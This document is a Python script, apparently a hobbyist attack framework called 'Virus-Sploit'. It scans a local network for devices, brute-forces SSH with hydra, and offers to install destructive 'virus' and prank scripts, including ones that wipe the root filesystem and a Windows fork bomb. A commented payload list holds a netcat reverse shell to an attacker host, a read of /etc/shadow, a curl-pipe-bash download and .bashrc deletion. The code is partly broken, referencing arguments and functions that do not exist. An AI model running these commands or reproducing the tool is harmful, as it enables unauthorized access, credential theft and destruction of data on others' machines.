import os
import time as t 
import sys 
import argparse
import colorama 
import pyfiglet
from colorama import init 
from colorama import Fore 
from termcolor import cprint
from datetime import datetime
import datetime as dt


init()

parser = argparse.ArgumentParser()
args = parser.parse_args()

def pscan():
    cls()
    print(banner)
    CS(5)
    cls()
    print(banner)
    A = str(input(" IP to scan ==> "))
    print(Fore.YELLOW+"Scanning 1-200 IP's on local network ")
    cls()
    print(banner)
    os.system(f' nmap -F {A}-200')

def scripts():
    print(Fore.YELLOW+"")
    print(" ______________________ ALL LINUX SSH SCRIPTS______________________")
    print(" ./damage-net.sh | this will disable all network services         |")
    print(" ./restart.sh    | this will restart the entire device            |")
    print(" ./remove.sh     | this will remove the entire os's root sys      |")
    print(" ./poweroff.sh   | obvious cheif                                  |")
    print(" python3 annoy.py| will constantly speak | OS fucked |            |")
    print(" ________________|______ALL CURRENT WIN32/64 SCRIPTS______________|")
    print(" fork.bat        | fork bomb for windows 10                       | ")
    print(" win-1.bat       | just randomness for winodws 10                 | ")
    print(" win-2.bat       | spawns random calculator                       | ")
    print("------------------------------------------------------------------|")
    print(" | NOTICES | ")
    print(" make sure to chmod the files EX | chmod +x ./poweroff.sh ")
    print(" then run as sudo in the ssh term ")
    print(" ================================= ")
    print(" sudo ./poweroff.sh ")
    print(" ++++++++HAVE FUN!!!!!!!!!+++++++")

def connect():
    cls()
    print(banner)
    t.sleep(1)
    A = str(input(" Whats the ssh Device name ==> "))
    print(" ============================================ ")
    B = str(input(" IPV4 of the ssh ==> "))
    os.system(f' gnome-terminal -- ssh {A}@{B} ')




def CS(X):
   t.sleep(X)
   cls()

def scan1():
    print(Fore.YELLOW+"----------Running local Network scans--------")
    os.system(' sudo arp-scan -l --verbose ')
    print(Fore.BLUE+" -----------PCAP File Scan------------------- ")
    os.system(' tshark -r ./scan/scan.pcap ')
    print(Fore.BLUE+"")
    print(' -------------SCANNING FINISHED AT ==> ' + str(datetime.now()))
    print(" --------------------Port scanning-----------------------")
    print(" | ")
    print(" | ")
    print(" Enter the networks main IPA EX ==> 10.0.0.0 ")
    A = str(input(" Network main IP ====> "))
    print(Fore.MAGENTA+"")
    print("[INFO ==>] Nmap will scan 200 IPA's in under 10 seconds")
    os.system(f' sudo nmap -F {A}-200 ')
    t.sleep(10)
    print(" ================================================ ")
    print(" note when you press enter info will be cleared   ")
    print(" ================================================")
    A = str(input(" press enter when you want to continue    "))
    CS(2)
    print(Fore.RED+"")
    print(banner)
    connect()

def up():
    os.system(' sudo apt-get update && sudo apt-get upgrade ')


def scan():
	if not args.no_scan and not args.safe:
		os.system('sudo arp-scan -g '+args.ip_range+' -W ./scan/scan.pcap')
		os.system('tshark -r ./scan/scan.pcap > ./scan/pcap.txt 2>/dev/null')
		os.system('cat ./scan/pcap.txt | grep -i "rasp" > ./scan/raspi_list')
		os.system('awk \'{print $8}\' ./scan/raspi_list > ./scan/rpi_list')
		os.system('rm -rf ./scan/scan.pcap && rm -rf ./scan/pcap.txt && rm -rf ./scan/raspi_list')
		cprint('\nlocated '+ str(sum(1 for line in open ('./scan/rpi_list'))) + ' raspi\'s', 'yellow')

def cls():
    os.system(' clear ')

def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)

def help1():
    print('''
    --------------------------------------------
    Option [1] Brute force the ssh using hydra | 
    --------------------------------------------
    Option [2] get the system info =coming soon|
    --------------------------------------------
    Option [3] Scan the network again          |
    --------------------------------------------
    Option [4] Scan more IP's                  |
    --------------------------------------------
    Option [restart] restart the program       |
    --------------------------------------------
    Option [5] Login to a ssh                  |
    --------------------------------------------

    ''')


## payloads and tricks 
#'''' 
#payloads={
#'reverse_shell':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+str(args.host)+' '+str(args.port)+' >/tmp/fc',
#'apt_update':'sudo apt update \&\& sudo apt -y upgrade',#
#'raincow_install':'sudo apt -y install fortune cowsay lolcat',
#'gitpip':'sudo apt -y install git python-pip',
#'shadow':'sudo cat /etc/shadow',
#'warning':'sudo echo "echo "change your password!"" \> \~/.bashrc',
#'raincow_bashrc':'sudo echo "fortune \| cowsay \| lolcat" \>\> \~/.bashrc',
#'rickroll':'curl -s -l http://bit.ly/10ha8ic | bash',
#'rm_bashrc':'rm -rf \~/.bashrc'
#}
###

CS(2)
cls()
t.sleep(1)
print(" framework will start in 5 seconds")
t.sleep(5)
os.system(' clear ')
print(Fore.RED+"")
banner = pyfiglet.figlet_format("Virus-Sploit", font = "slant")

print(banner)
print("                                 version  |  1.0  |")
print("                              OS -support | linux | ")

print(" would you like to scan the network for devices? ")
W = str(input(" Y/n ===> "))

if "Y" in W:
       t.sleep(1)
       os.system(' clear ')
       print(banner)
       scan1()

if 'n' in W:
    t.sleep(1)
    cls()
    print(banner)



cls()
print(banner)
t.sleep(1)
print(" would you like to install all virus's and prank scripts inside the ssh? ")
A = str(input(" Y/n ==> "))

if 'Y' in A:
    os.system(f' chmod +x ./nerterm.sh && gnome-terminal -- ./nerterm.sh ')
    os.system(' clear ')
    connect()

if 'n' in A:
       cls()
       print(banner)
       connect()
       scripts()

else:
    print(" [INFO} ==> opening up SSH connection ")
    connect()

cls()
print(banner)
scripts()
print(" type help to view extra ")
extra = str(input(" Extra Commands ==> "))

if 'help' in extra:
          cls()
          print(banner)


def extra():
    help1()
    extra1 = str(input(" Options ===> "))
    if '1' in extra1:
       cls()
       print(banner)
       os.system(' chmod +x ./brute.sh && ./brute.sh ')
       extra()

    elif '3' in extra1:
            cls()
            print(banner)
            scan1()
            extra()

    elif '4' == extra1:
        t.sleep(1)
        pscan()
        extra()

    elif 'menu' == extra1:
        t.sleep(1)
        cls()
        print(banner)
        menu()
        extra()
    
    elif 'restart' == extra1:
        CS(1)
        cls()
        print(banner)
        print(" [!] restarting program in 5 seconds ")
        t.sleep(5)
        cls()
        restart_program()
    
    
    elif '5' == extra1:
        t.sleep(1)
        cls()
        print(banner)
        connect()
        cls()
        extra()

    else:
        print(Fore.RED+" [!] Whoops! thats not a command [!] ")
        cls()
        extra()

extra()
